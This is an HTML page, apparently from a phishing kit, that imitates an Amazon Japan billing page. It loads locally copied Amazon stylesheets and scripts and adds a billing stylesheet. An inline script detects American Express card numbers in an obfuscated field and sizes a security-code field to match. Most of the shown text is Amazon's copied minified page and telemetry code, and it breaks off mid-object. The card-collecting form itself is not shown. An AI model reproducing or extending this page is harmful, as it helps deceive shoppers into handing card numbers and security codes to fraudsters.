﻿<!DOCTYPE html>
<html lang="en"
      class="a-ws a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember"
      data-aui-build-date="3.19.2-2019-02-20">

<meta http-equiv="content-type" content="text/html;charset=UTF-8"/>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
    <link rel="stylesheet" href="library/fontawesome/css/fontawesome-all.min.css">
    <link rel="stylesheet" href="library/bootstrap/css/main.min.css">
    <link rel="stylesheet" href="sheets/alert.css">
    <link rel="stylesheet" href="sheets/accbilling.css">
    <link rel="stylesheet" href="aa/41%2b819VXLqL.css">
    <meta name="referrer" content="no-referrer"/>
    <script type="text/javascript">var ue_t0 = ue_t0 || +new Date();</script>
    <script type="text/javascript">
        function upperCase() {
            var x = document.getElementById("cxdi").value;
            if ((/^3[47][0-9]{13}$/.test(x)) == true) {
                document.getElementById("vxvxc").setAttribute("maxlength", "4");
            } else {
                document.getElementById("vxvxc").setAttribute("maxlength", "3");
            }
        }
    </script>
    <script>
        (function (g, h, Q, y) {
            function G(a) {
                v && v.tag && v.tag(q(":", "aui", a))
            }

            function z(a, b) {
                v && v.count && v.count("aui:" + a, 0 === b ? 0 : b || (v.count("aui:" + a) || 0) + 1)
            }

            function m(a) {
                try {
                    return a.test(navigator.userAgent)
                } catch (b) {
                    return !1
                }
            }

            function w(a, b, c) {
                a.addEventListener ? a.addEventListener(b, c, !1) : a.attachEvent && a.attachEvent("on" + b, c)
            }

            function q(a, b, c, d) {
                b = b && c ? b + a + c : b || c;
                return d ? q(a, b, d) : b
            }

            function H(a, b, c) {
                try {
                    Object.defineProperty(a, b, {value: c, writable: !1})
                } catch (d) {
                    a[b] = c
                }
                return c
            }

            function R() {
                return setTimeout(ba,
                        0)
            }

            function ua(a, b) {
                var c = a.length, d = c, f = function () {
                    d-- || (S.push(b), T || (R(), T = !0))
                };
                for (f(); c--;) ca[a[c]] ? f() : (B[a[c]] = B[a[c]] || []).push(f)
            }

            function va(a, b, c, d, f) {
                var e = h.createElement(a ? "script" : "link");
                w(e, "error", d);
                f && w(e, "load", f);
                if (a) {
                    e.type = "text/javascript";
                    e.async = !0;
                    if (a = c) a = -1 !== b.indexOf("images/I") || /AUIClients/.test(b);
                    a && e.setAttribute("crossorigin", "anonymous");
                    e.src = b
                } else e.rel = "stylesheet", e.href = b;
                h.getElementsByTagName("head")[0].appendChild(e)
            }

            function da(a, b) {
                function c(c,
                           d) {
                    function f() {
                        va(b, c, h, function (b) {
                            !I && h ? (h = !1, z("resource_retry"), f()) : (z("resource_error"), a.log("Asset failed to load: " + c, I ? "WARN" : y));
                            b && b.stopPropagation ? b.stopPropagation() : g.event && (g.event.cancelBubble = !0)
                        }, d)
                    }

                    if (ea[c]) return !1;
                    ea[c] = !0;
                    z("resource_count");
                    var h = !0;
                    return !f()
                }

                if (b) {
                    var d = 0, f = 0;
                    c.andConfirm = function (a, b) {
                        return c(a, function () {
                            d++;
                            b && b.apply(this, arguments)
                        })
                    };
                    c.confirm = function () {
                        f++
                    };
                    c.getCsriCounters = function () {
                        return {reqs: d, full: f}
                    }
                }
                return c
            }

            function wa(a, b, c) {
                for (var d =
                        {
                            name: a, guard: function (c) {
                                return b.guardFatal(a, c)
                            }, logError: function (c, d, f) {
                                b.logError(c, d, f, a)
                            }
                        }, f = [], e = 0; e < c.length; e++) J.hasOwnProperty(c[e]) && (f[e] = U.hasOwnProperty(c[e]) ? U[c[e]](J[c[e]], d) : J[c[e]]);
                return f
            }

            function C(a, b, c, d, f) {
                return function (e, h) {
                    function m() {
                        var a = null;
                        d ? a = h : "function" === typeof h && (p.start = D(), a = h.apply(g, wa(e, k, l)), p.end = D());
                        if (b) {
                            J[e] = a;
                            a = e;
                            for (ca[a] = !0; (B[a] || []).length;) B[a].shift()();
                            delete B[a]
                        }
                        p.done = !0
                    }

                    var k = f || this;
                    "function" === typeof e && (h = e, e = y);
                    b && (e = e ? e.replace(fa,
                            "") : "__NONAME__", V.hasOwnProperty(e) && k.error(q(", reregistered by ", q(" by ", e + " already registered", V[e]), k.attribution), e), V[e] = k.attribution);
                    for (var l = [], n = 0; n < a.length; n++) l[n] = a[n].replace(fa, "");
                    var p = ga[e || "anon" + ++xa] = {depend: l, registered: D(), namespace: k.namespace};
                    c ? m() : ua(l, k.guardFatal(e, m));
                    return {
                        decorate: function (a) {
                            U[e] = k.guardFatal(e, a)
                        }
                    }
                }
            }

            function ha(a) {
                return function () {
                    var b = Array.prototype.slice.call(arguments);
                    return {execute: C(b, !1, a, !1, this), register: C(b, !0, a, !1, this)}
                }
            }

            function W(a,
                       b) {
                return function (c, d) {
                    d || (d = c, c = y);
                    var f = this.attribution;
                    return function () {
                        A.push(b || {attribution: f, name: c, logLevel: a});
                        var e = d.apply(this, arguments);
                        A.pop();
                        return e
                    }
                }
            }

            function K(a, b) {
                this.load = {js: da(this, !0), css: da(this)};
                H(this, "namespace", b);
                H(this, "attribution", a)
            }

            function ia() {
                h.body ? p.trigger("a-bodyBegin") : setTimeout(ia, 20)
            }

            function E(a, b) {
                if (b) {
                    for (var c = a.className.split(" "), d = c.length; d--;) if (c[d] === b) return;
                    a.className += " " + b
                }
            }

            function ja(a, b) {
                for (var c = a.className.split(" "), d = [],
                             f; (f = c.pop()) !== y;) f && f !== b && d.push(f);
                a.className = d.join(" ")
            }

            function ka(a) {
                try {
                    return a()
                } catch (b) {
                    return !1
                }
            }

            function L() {
                if (M) {
                    var a = g.innerWidth ? {w: g.innerWidth, h: g.innerHeight} : {w: l.clientWidth, h: l.clientHeight};
                    5 < Math.abs(a.w - X.w) || 50 < a.h - X.h ? (X = a, N = 4, (a = k.mobile || k.tablet ? 450 < a.w && a.w > a.h : 1250 <= a.w) ? E(l, "a-ws") : ja(l, "a-ws")) : 0 < N && (N--, la = setTimeout(L, 16))
                }
            }

            function ya(a) {
                (M = a === y ? !M : !!a) && L()
            }

            function za() {
                return M
            }

            function r(a, b) {
                return "sw:" + (b || "") + ":" + a + ":"
            }

            function ma() {
                na.forEach(function (a) {
                    G(a)
                })
            }

            function n(a) {
                na.push(a)
            }

            function oa(a, b, c, d) {
                if (c) {
                    b = m(/Chrome/i) && !m(/Edge/i) && !m(/OPR/i) && !a.capabilities.isAmazonApp && !m(new RegExp(Y + "bwv" + Y + "b"));
                    var f = r(d, "browser"), e = r(d, "prod_mshop"), g = r(d, "beta_mshop");
                    !a.capabilities.isAmazonApp && c.browser && b && (n(f + "supported"), c.browser.action(f, d));
                    !b && c.browser && n(f + "unsupported");
                    c.prodMshop && n(e + "unsupported");
                    c.betaMshop && n(g + "unsupported")
                }
            }

            "use strict";
            var O = Q.now = Q.now || function () {
                        return +new Q
                    }, D = function (a) {
                        return a && a.now ? a.now.bind(a) : O
                    }(g.performance),
                    Aa = D(), t = g.AmazonUIPageJS || g.P;
            if (t && t.when && t.register) throw Error("A copy of P has already been loaded on this page.");
            var v = g.ue;
            G();
            G("aui_build_date:3.19.2-2019-02-20");
            var S = [], T = !1, ba;
            ba = function () {
                for (var a = R(), b = O(); S.length;) if (S.shift()(), 50 < O() - b) return;
                clearTimeout(a);
                T = !1
            };
            m(/OS 6_[0-9]+ like Mac OS X/i) && w(g, "scroll", R);
            var ca = {}, B = {}, ea = {}, I = !1;
            w(g, "beforeunload", function () {
                I = !0;
                setTimeout(function () {
                    I = !1
                }, 1E4)
            });
            var fa = /^prv:/, V = {}, J = {}, U = {}, ga = {}, xa = 0, Y = String.fromCharCode(92), F,
                    A = [], pa = g.onerror;
            g.onerror = function (a, b, c, d, f) {
                f && "object" === typeof f || (f = Error(a, b, c), f.columnNumber = d, f.stack = b || c || d ? q(Y, f.message, "at " + q(":", b, c, d)) : y);
                var e = A.pop() || {};
                f.attribution = q(":", f.attribution || e.attribution, e.name);
                f.logLevel = e.logLevel;
                f.attribution && console && console.log && console.log([f.logLevel || "ERROR", a, "thrown by", f.attribution].join(" "));
                A = [];
                pa && (e = [].slice.call(arguments), e[4] = f, pa.apply(g, e))
            };
            K.prototype = {
                logError: function (a, b, c, d) {
                    b = {
                        message: b, logLevel: c || "ERROR", attribution: q(":",
                                this.attribution, d)
                    };
                    if (g.ueLogError) return g.ueLogError(a || b, a ? b : null), !0;
                    console && console.error && (console.log(b), console.error(a));
                    return !1
                }, error: function (a, b, c, d) {
                    a = Error(q(":", d, a, c));
                    a.attribution = q(":", this.attribution, b);
                    throw a;
                }, guardError: W(), guardFatal: W("FATAL"), guardCurrent: function (a) {
                    var b = A[A.length - 1];
                    return b ? W(b.logLevel, b).call(this, a) : a
                }, log: function (a, b, c) {
                    return this.logError(null, a, b, c)
                }, declare: C([], !0, !0, !0), register: C([], !0), execute: C([]), AUI_BUILD_DATE: "3.19.2-2019-02-20",
                when: ha(), now: ha(!0), trigger: function (a, b, c) {
                    var d = O();
                    this.declare(a, {data: b, pageElapsedTime: d - (g.aPageStart || NaN), triggerTime: d});
                    c && c.instrument && F.when("prv:a-logTrigger").execute(function (b) {
                        b(a)
                    })
                }, handleTriggers: function () {
                    this.log("handleTriggers deprecated")
                }, attributeErrors: function (a) {
                    return new K(a)
                }, _namespace: function (a, b) {
                    return new K(a, b)
                }
            };
            var p = H(g, "AmazonUIPageJS", new K);
            F = p._namespace("PageJS", "AmazonUI");
            F.declare("prv:p-debug", ga);
            p.declare("p-recorder-events", []);
            p.declare("p-recorder-stop",
                    function () {
                    });
            H(g, "P", p);
            ia();
            if (h.addEventListener) {
                var qa;
                h.addEventListener("DOMContentLoaded", qa = function () {
                    p.trigger("a-domready");
                    h.removeEventListener("DOMContentLoaded", qa, !1)
                }, !1)
            }
            var l = h.documentElement, Z = function () {
                var a = ["O", "ms", "Moz", "Webkit"], b = h.createElement("div");
                return {
                    testGradients: function () {
                        b.style.cssText = "background-image:-webkit-gradient(linear,left top,right bottom,from(#9f9),to(white));background-image:-webkit-linear-gradient(left top,#9f9,white);background-image:linear-gradient(left top,#9f9,white);";
                        return -1 < b.style.backgroundImage.indexOf("gradient")
                    }, test: function (c) {
                        var d = c.charAt(0).toUpperCase() + c.substr(1);
                        c = (a.join(d + " ") + d + " " + c).split(" ");
                        for (d = c.length; d--;) if ("" === b.style[c[d]]) return !0;
                        return !1
                    }, testTransform3d: function () {
                        var a = !1;
                        g.matchMedia && (a = g.matchMedia("(-webkit-transform-3d)").matches);
                        return a
                    }
                }
            }(), t = l.className, ra = /(^| )a-mobile( |$)/.test(t), sa = /(^| )a-tablet( |$)/.test(t), k = {
                audio: function () {
                    return !!h.createElement("audio").canPlayType
                }, video: function () {
                    return !!h.createElement("video").canPlayType
                },
                canvas: function () {
                    return !!h.createElement("canvas").getContext
                }, svg: function () {
                    return !!h.createElementNS && !!h.createElementNS("http://www.w3.org/2000/svg", "svg").createSVGRect
                }, offline: function () {
                    return navigator.hasOwnProperty && navigator.hasOwnProperty("onLine") && navigator.onLine
                }, dragDrop: function () {
                    return "draggable" in h.createElement("span")
                }, geolocation: function () {
                    return !!navigator.geolocation
                }, history: function () {
                    return !(!g.history || !g.history.pushState)
                }, webworker: function () {
                    return !!g.Worker
                },
                autofocus: function () {
                    return "autofocus" in h.createElement("input")
                }, inputPlaceholder: function () {
                    return "placeholder" in h.createElement("input")
                }, textareaPlaceholder: function () {
                    return "placeholder" in h.createElement("textarea")
                }, localStorage: function () {
                    return "localStorage" in g && null !== g.localStorage
                }, orientation: function () {
                    return "orientation" in g
                }, touch: function () {
                    return "ontouchend" in h
                }, gradients: function () {
                    return Z.testGradients()
                }, hires: function () {
                    var a = g.devicePixelRatio && 1.5 <= g.devicePixelRatio ||
                            g.matchMedia && g.matchMedia("(min-resolution:144dpi)").matches;
                    z("hiRes" + (ra ? "Mobile" : sa ? "Tablet" : "Desktop"), a ? 1 : 0);
                    return a
                }, transform3d: function () {
                    return Z.testTransform3d()
                }, touchScrolling: function () {
                    return m(/Windowshop|android.([3-9]|[L-Z])|OS ([5-9]|[1-9][0-9]+)(_[0-9]{1,2})+ like Mac OS X|Chrome|Silk|Firefox|Trident.+?; Touch/i)
                }, ios: function () {
                    return m(/OS [1-9][0-9]*(_[0-9]*)+ like Mac OS X/i) && !m(/trident|Edge/i)
                }, android: function () {
                    return m(/android.([1-9]|[L-Z])/i) && !m(/trident|Edge/i)
                },
                mobile: function () {
                    return ra
                }, tablet: function () {
                    return sa
                }, rtl: function () {
                    return "rtl" === l.dir
                }
            }, u;
            for (u in k) k.hasOwnProperty(u) && (k[u] = ka(k[u]));
            for (var aa = "textShadow textStroke boxShadow borderRadius borderImage opacity transform transition".split(" "), P = 0; P < aa.length; P++) k[aa[P]] = ka(function () {
                return Z.test(aa[P])
            });
            var M = !0, la = 0, X = {w: 0, h: 0}, N = 4;
            L();
            w(g, "resize", function () {
                clearTimeout(la);
                N = 4;
                L()
            });
            var ta = {
                getItem: function (a) {
                    try {
                        return g.localStorage.getItem(a)
                    } catch (b) {
                    }
                }, setItem: function (a,
                                      b) {
                    try {
                        return g.localStorage.setItem(a, b)
                    } catch (c) {
                    }
                }
            };
            ja(l, "a-no-js");
            E(l, "a-js");
            !m(/OS [1-8](_[0-9]*)+ like Mac OS X/i) || g.navigator.standalone || m(/safari/i) || E(l, "a-ember");
            t = [];
            for (u in k) k.hasOwnProperty(u) && k[u] && t.push("a-" + u.replace(/([A-Z])/g, function (a) {
                return "-" + a.toLowerCase()
            }));
            E(l, t.join(" "));
            l.setAttribute("data-aui-build-date", "3.19.2-2019-02-20");
            p.register("p-detect", function () {
                return {
                    capabilities: k,
                    localStorage: k.localStorage && ta,
                    toggleResponsiveGrid: ya,
                    responsiveGridEnabled: za
                }
            });
            m(/UCBrowser/i) || k.localStorage && E(l, ta.getItem("a-font-class"));
            p.declare("a-event-revised-handling", !1);
            var x;
            try {
                x = navigator.serviceWorker
            } catch (a) {
                G("sw:nav_err")
            }
            x && (w(x, "message", function (a) {
                a && a.data && z(a.data.k, a.data.v)
            }), x.controller && x.controller.postMessage("MSG-RDY"));
            var na = [];
            (function (a) {
                var b = a.reg, c = a.unreg;
                x && x.getRegistrations ? (F.when("A", "a-util").execute(function (a, b) {
                    oa(a, b, c, "unregister")
                }), w(g, "load", function () {
                    F.when("A", "a-util").execute(function (a, c) {
                        oa(a, c, b, "register");
                        ma()
                    })
                })) : (b && (b.browser && n(r("register", "browser") + "unsupported"), b.prodMshop && n(r("register", "prod_mshop") + "unsupported"), b.betaMshop && n(r("register", "beta_mshop") + "unsupported")), c && (c.browser && n(r("unregister", "browser") + "unsupported"), c.prodMshop && n(r("unregister", "prod_mshop") + "unsupported"), c.betaMshop && n(r("unregister", "beta_mshop") + "unsupported")), ma())
            })({reg: {}, unreg: {}});
            p.declare("a-fix-event-off", !1);
            z("pagejs:pkgExecTime", D() - Aa)
        })(window, document, Date);
        (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/61HHaoAEflL._RC|11-BZEJ8lnL.js,61DmQ7Ysp5L.js,21Of0-9HPCL.js,012FVc3131L.js,119KAWlHU6L.js,01JTmZVCmIL.js,01ynJvifvjL.js,51keOj-1JaL.js,11AHlQhPRjL.js,016iHgpF74L.js,11aNYFFS5hL.js,116tgw9TSaL.js,211-p4GRUCL.js,01PoLXBDXWL.js,61BsuCRwHCL.js,01mi-J86cyL.js,11BOgvnnntL.js,310xuTUX4pL.js,01rpauTep4L.js,01iyxuSGj4L.js,01SRWeF77hL.js_.js?AUIClients/AmazonUI#170461-T1.144375-T1');
        (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-na.ssl-images-amazon.com/images/I/210Sa6NRpgL.js?AUIClients/YourAccountAddressBookAssets#163577-T1');
    </script>
    <script type="text/javascript">
        window.ue_ihb = (window.ue_ihb || window.ueinit || 0) + 1;
        if (window.ue_ihb === 1) {

            var ue_csm = window,
                    ue_hob = +new Date();
            (function (d) {
                var e = d.ue = d.ue || {}, f = Date.now || function () {
                    return +new Date
                };
                e.d = function (b) {
                    return f() - (b ? 0 : d.ue_t0)
                };
                e.stub = function (b, a) {
                    if (!b[a]) {
                        var c = [];
                        b[a] = function () {
                            c.push([c.slice.call(arguments), e.d(), d.ue_id])
                        };
                        b[a].replay = function (b) {
                            for (var a; a = c.shift();) b(a[0], a[1], a[2])
                        };
                        b[a].isStub = 1
                    }
                };
                e.exec = function (b, a) {
                    return function () {
                        if (1 == window.ueinit) try {
                            return b.apply(this, arguments)
                        } catch (c) {
                            ueLogError(c, {attribution: a || "undefined", logLevel: "WARN"})
                        }
                    }
                }
            })(ue_csm);


            var ue_err_chan = 'jserr-rw';
            (function (d, e) {
                function h(f, b) {
                    if (!(a.ec > a.mxe) && f) {
                        a.ter.push(f);
                        b = b || {};
                        var c = f.logLevel || b.logLevel;
                        c && c !== k && c !== m && c !== n && c !== p || a.ec++;
                        c && c != k || a.ecf++;
                        b.pageURL = "" + (e.location ? e.location.href : "");
                        b.logLevel = c;
                        b.attribution = f.attribution || b.attribution;
                        a.erl.push({ex: f, info: b})
                    }
                }

                function l(a, b, c, e, g) {
                    d.ueLogError({
                        m: a,
                        f: b,
                        l: c,
                        c: "" + e,
                        err: g,
                        fromOnError: 1,
                        args: arguments
                    }, g ? {attribution: g.attribution, logLevel: g.logLevel} : void 0);
                    return !1
                }

                var k = "FATAL", m = "ERROR", n = "WARN", p = "DOWNGRADED", a = {
                    ec: 0, ecf: 0,
                    pec: 0, ts: 0, erl: [], ter: [], mxe: 50, startTimer: function () {
                        a.ts++;
                        setInterval(function () {
                            d.ue && a.pec < a.ec && d.uex("at");
                            a.pec = a.ec
                        }, 1E4)
                    }
                };
                l.skipTrace = 1;
                h.skipTrace = 1;
                h.isStub = 1;
                d.ueLogError = h;
                d.ue_err = a;
                e.onerror = l
            })(ue_csm, window);


            var ue_id = 'FCV0NEY1AQZJ7G7F79VF',
                    ue_url = '/gp/uedata',
                    ue_navtiming = 1,
                    ue_mid = 'A1VC38T7YXB528',
                    ue_sid = '355-4640336-8235941',
                    ue_sn = 'www.amazon.co.jp',
                    ue_int = 0,
                    ue_fcsn = 1,
                    ue_urt = 3,
                    ue_rpl_ns = 'cel-rpl',
                    ue_ddq = 1,
                    ue_fpf = '//fls-fe.amazon.co.jp/1/batch/1/OP/A1VC38T7YXB528:355-4640336-8235941:FCV0NEY1AQZJ7G7F79VF$uedata=s:',
                    ue_rsc = 0,
                    ue_mcimp = 0,
                    ue_sbuimp = 1,

                    ue_swi = 1;

            function ue_viz() {
                (function (c, e, a) {
                    function k(b) {
                        if (c.ue.viz.length < p && !l) {
                            var a = b.type;
                            b = b.originalEvent;
                            /^focus./.test(a) && b && (b.toElement || b.fromElement || b.relatedTarget) || (a = e[m] || ("blur" == a || "focusout" == a ? "hidden" : "visible"), c.ue.viz.push(a + ":" + (+new Date - c.ue.t0)), "visible" == a && (ue.isl && uex("at"), l = 1))
                        }
                    }

                    for (var l = 0, f, g, m, n = ["", "webkit", "o", "ms", "moz"], d = 0, p = 20, h = 0; h < n.length && !d; h++) if (a = n[h], f = (a ? a + "H" : "h") + "idden", d = "boolean" == typeof e[f]) g = a + "visibilitychange", m = (a ? a + "V" : "v") + "isibilityState";
                    k({});
                    d && e.addEventListener(g, k, 0);
                    c.ue && d && (c.ue.pageViz = {event: g, propHid: f})
                })(ue_csm, document, window)
            };

            (function (a, g, u) {
                function x(a) {
                    return a && a.replace && a.replace(/^\s+|\s+$/g, "")
                }

                function q(a) {
                    return "undefined" === typeof a
                }

                function y(a) {
                    try {
                        var b = u.cookie.match(RegExp("(^| )" + a + "=([^;]+)"));
                        if (b) return b[2].trim()
                    } catch (c) {
                    }
                }

                function A(d, b) {
                    d && (a.ue_id = h.id = h.rid = d, a.ue_fpf = a.ue_fpf.replace(/((.*?:){2})(\w+)/, function (a, b) {
                        return b + d
                    }));
                    b && (a.ue_fpf = a.ue_fpf.replace(/(.*?:)(\w|-)+/, function (a, d) {
                        return d + b
                    }), a.ue_sid = b);
                    a.ue.tag("accelerated-experience")
                }

                function t(d, b, c, k) {
                    var g = k || +new Date, n;
                    a.ueam && a.ueam(b, d, k);
                    if (b || q(c)) {
                        if (d) for (n in k = b ? f("t", b) || f("t", b, {}) : a.ue.t, k[d] = g, c) c.hasOwnProperty(n) && f(n, b, c[n]);
                        return g
                    }
                }

                function f(d, b, c) {
                    var f = a.ue, g = b && b != f.id ? f.sc[b] : f;
                    g || (g = f.sc[b] = {});
                    "id" == d && c && (f.cfa2 = 1);
                    return g[d] = c || g[d]
                }

                function C(d, b, c, f, g) {
                    c = "on" + c;
                    var n = b[c];
                    "function" === typeof n ? d && (a.ue.h[d] = n) : n = function () {
                    };
                    b[c] = g ? function (a) {
                        f(a);
                        n(a)
                    } : function (a) {
                        n(a);
                        f(a)
                    };
                    b[c] && (b[c].isUeh = 1)
                }

                function D(d, b, c) {
                    function k(b, c) {
                        var e = [b], J = 0, g = {}, n, k;
                        c ? (e.push("m=1"), g[c] = 1) : g = a.ue.sc;
                        for (k in g) if (g.hasOwnProperty(k)) {
                            var l = f("wb", k), h = f("t", k) || {}, p = f("t0", k) || a.ue.t0, m;
                            if (c || 2 == l) {
                                l = l ? J++ : "";
                                e.push("sc" + l + "=" + k);
                                for (m in h) 3 >= m.length && !q(h[m]) && null !== h[m] && e.push(m + l + "=" + (h[m] - p));
                                e.push("t" + l + "=" + h[d]);
                                if (f("ctb", k) || f("wb", k)) n = 1
                            }
                        }
                        !z && n && e.push("ctb=1");
                        return e.join("&")
                    }

                    function B(b, c, d, e) {
                        if (b) {
                            var f = a.ue_err, k;
                            a.ue_url && (!e || !a.ue.log) && b && 0 < b.length && (k = new Image, a.ue.iel.push(k), k.src = b);
                            K ? a.ue_fpf && g.encodeURIComponent && b && (e = new Image, b = "" + a.ue_fpf + g.encodeURIComponent(b) +
                                    ":" + (+new Date - a.ue_t0), a.ue.iel.push(e), e.src = b) : a.ue.log && (k = g.chrome && "ul" == c, a.ue.log(b, "uedata", a.ue_svi ? {
                                n: 1,
                                img: !e && k ? 1 : 0
                            } : {n: 1}), a.ue.ielf.push(b));
                            f && !f.ts && f.startTimer();
                            a.ue.b && (f = a.ue.b, a.ue.b = "", B(f, c, d, 1))
                        }
                    }

                    function n(b) {
                        if (!ue.collected) {
                            var c = b.timing, e = b.navigation, d = ue.t;
                            c && (d.na_ = c.navigationStart, d.ul_ = c.unloadEventStart, d._ul = c.unloadEventEnd, d.rd_ = c.redirectStart, d._rd = c.redirectEnd, d.fe_ = c.fetchStart, d.lk_ = c.domainLookupStart, d._lk = c.domainLookupEnd, d.co_ = c.connectStart, d._co =
                                    c.connectEnd, d.sc_ = c.secureConnectionStart, d.rq_ = c.requestStart, d.rs_ = c.responseStart, d._rs = c.responseEnd, d.dl_ = c.domLoading, d.di_ = c.domInteractive, d.de_ = c.domContentLoadedEventStart, d._de = c.domContentLoadedEventEnd, d._dc = c.domComplete, d.ld_ = c.loadEventStart, d._ld = c.loadEventEnd, c = d.na_, b = "function" !== typeof b.now || q(c) ? 0 : new Date(c + b.now()) - new Date, d.ntd = b + a.ue.t0);
                            e && (d.ty = e.type + a.ue.t0, d.rc = e.redirectCount + a.ue.t0);
                            ue.collected = 1
                        }
                    }

                    function s(b) {
                        var c = r && r.navigation ? r.navigation.type : w, d = c &&
                                2 != c, e = a.ue.bfini;
                        a.ue.cfa2 || (e && 1 < e && (b += "&bfform=1", d || (a.ue.isBFT = e - 1)), 2 == c && (b += "&bfnt=1", a.ue.isBFT = a.ue.isBFT || 1), a.ue.ssw && a.ue.isBFT && (q(a.ue.isNRBF) && (c = a.ue.ssw(a.ue.oid), c.e || q(c.val) || (a.ue.isNRBF = 1 < c.val ? 0 : 1)), q(a.ue.isNRBF) || (b += "&nrbf=" + a.ue.isNRBF)), a.ue.isBFT && !a.ue.isNRBF && (b += "&bft=" + a.ue.isBFT));
                        return b
                    }

                    if (!h.paused && (b || q(c))) {
                        for (var p in c) c.hasOwnProperty(p) && f(p, b, c[p]);
                        t("pc", b, c);
                        p = f("id", b) || a.ue.id;
                        var e = a.ue.url + "?" + d + "&v=" + a.ue.v + "&id=" + p, z = f("ctb", b) || f("wb", b), r =
                                g.performance || g.webkitPerformance, l, m;
                        z && (e += "&ctb=" + z);
                        1 < a.ueinit && (e += "&ic=" + a.ueinit);
                        !a.ue._fi || "at" != d || b && b != p || (e += a.ue._fi());
                        if (!("ld" != d && "ul" != d || b && b != p)) {
                            if ("ld" == d) {
                                try {
                                    g.onbeforeunload && g.onbeforeunload.isUeh && (g.onbeforeunload = null)
                                } catch (y) {
                                }
                                if (g.chrome) for (m = 0; m < ue.ulh.length; m++) E("beforeunload", ue.ulh[m]);
                                (m = u.ue_backdetect) && m.ue_back && m.ue_back.value++;
                                a._uess && (l = a._uess());
                                a.ue.isl = 1
                            }
                            ue._bf && (e += "&bf=" + ue._bf());
                            a.ue_navtiming && r && r.timing && (f("ctb", p, "1"), 1 == a.ue_navtiming &&
                            t("tc", w, w, r.timing.navigationStart));
                            r && n(r);
                            a.ue.t.hob = a.ue_hob;
                            a.ue.t.hoe = a.ue_hoe;
                            a.ue.ifr && (e += "&ifr=1")
                        }
                        t(d, b, c);
                        c = "ld" == d && b && f("wb", b);
                        var v;
                        c || b && b !== p || L(b);
                        c || p == a.ue.oid || M((f("t", b) || {}).tc || +f("t0", b), +f("t0", b));
                        a.ue_mbl && a.ue_mbl.cnt && !c && (e += a.ue_mbl.cnt());
                        c ? f("wb", b, 2) : "ld" == d && (h.lid = x(p));
                        for (v in a.ue.sc) if (1 == f("wb", v)) break;
                        if (c) {
                            if (a.ue.s) return;
                            e = k(e, null)
                        } else m = k(e, null), m != e && (m = s(m), a.ue.b = m), l && (e += l), e = k(e, b || a.ue.id);
                        e = s(e);
                        if (a.ue.b || c) for (v in a.ue.sc) 2 == f("wb",
                                v) && delete a.ue.sc[v];
                        l = 0;
                        ue._rt && (e += "&rt=" + ue._rt());
                        c || (a.ue.s = 0, (l = a.ue_err) && 0 < l.ec && l.pec < l.ec && (l.pec = l.ec, e += "&ec=" + l.ec + "&ecf=" + l.ecf), l = f("ctb", b), f("t", b, {}));
                        e && a.ue.tag && 0 < a.ue.tag().length && (e += "&csmtags=" + a.ue.tag().join("|"), a.ue.tag = a.ue.tagC());
                        e && a.ue.viz && 0 < a.ue.viz.length && (e += "&viz=" + a.ue.viz.join("|"), a.ue.viz = []);
                        e && !q(a.ue_pty) && (e += "&pty=" + a.ue_pty + "&spty=" + a.ue_spty + "&pti=" + a.ue_pti);
                        e && a.ue.tabid && (e += "&tid=" + a.ue.tabid);
                        e && a.ue.aftb && (e += "&aftb=1");
                        e && a.ue.sbf && (e += "&sbf=1");
                        !a.ue._ui || b && b != p || (e += a.ue._ui());
                        a.ue.a = e;
                        B(e, d, l, c)
                    }
                }

                function L(a) {
                    var b = g.ue_csm_markers || {}, c;
                    for (c in b) b.hasOwnProperty(c) && t(c, a, w, b[c])
                }

                function s(d, b, c) {
                    c = c || g;
                    a.ue_pel && window.EventTarget && window.EventTarget.prototype && window.EventTarget.prototype.addEventListener ? window.EventTarget.prototype.addEventListener.call(c, d, b, !!window.ue_clf) : c.addEventListener ? c.addEventListener(d, b, !!window.ue_clf) : c.attachEvent && c.attachEvent("on" + d, b)
                }

                function E(d, b, c) {
                    c = c || g;
                    a.ue_pel && window.EventTarget &&
                    window.EventTarget.prototype && window.EventTarget.prototype.removeEventListener ? window.EventTarget.prototype.removeEventListener.call(c, d, b, !!window.ue_clf) : c.removeEventListener ? c.removeEventListener(d, b, !!window.ue_clf) : c.detachEvent && c.detachEvent("on" + d, b)
                }

                function F() {
                    function d() {
                        a.onUl()
                    }

                    function b(a) {
                        return function () {
                            c[a] || (c[a] = 1, D(a))
                        }
                    }

                    var c = a.ue.r, f, h;
                    a.onLd = b("ld");
                    a.onLdEnd = b("ld");
                    a.onUl = b("ul");
                    f = {stop: b("os")};
                    g.chrome ? (s("beforeunload", d), ue.ulh.push(d)) : f[N] = a.onUl;
                    for (h in f) f.hasOwnProperty(h) &&
                    C(0, g, h, f[h]);
                    a.ue_viz && ue_viz();
                    O && s("readystatechange", P, u);
                    s("load", a.onLd);
                    t("ue")
                }

                function P() {
                    "complete" === u.readyState && (Q ? setTimeout(G, 0) : G())
                }

                function G() {
                    var d;
                    if (!(d = ue.isl) && (d = R)) a:{
                        d = u.images || [];
                        for (var b = 0; b < d.length; b++) if (!1 === d[b].complete) {
                            d = !1;
                            break a
                        }
                        d = !0
                    }
                    if (!d) a.onUl()
                }

                function M(d, b) {
                    a.ue_mbl && a.ue_mbl.ajax && a.ue_mbl.ajax(d, b);
                    a.ue.tag("ajax-transition")
                }

                a.ueinit = (a.ueinit || 0) + 1;
                var h = {
                            t0: g.aPageStart || a.ue_t0,
                            id: a.ue_id,
                            url: a.ue_url,
                            rid: a.ue_id,
                            a: "",
                            b: "",
                            h: {},
                            r: {
                                ld: 0, oe: 0,
                                ul: 0
                            },
                            s: 1,
                            t: {},
                            sc: {},
                            iel: [],
                            ielf: [],
                            fc_idx: {},
                            viz: [],
                            v: "0.202913.0",
                            d: a.ue && a.ue.d,
                            log: a.ue && a.ue.log,
                            clog: a.ue && a.ue.clog,
                            onflush: a.ue && a.ue.onflush,
                            onunload: a.ue && a.ue.onunload,
                            stub: a.ue && a.ue.stub,
                            lr: a.ue && a.ue.lr,
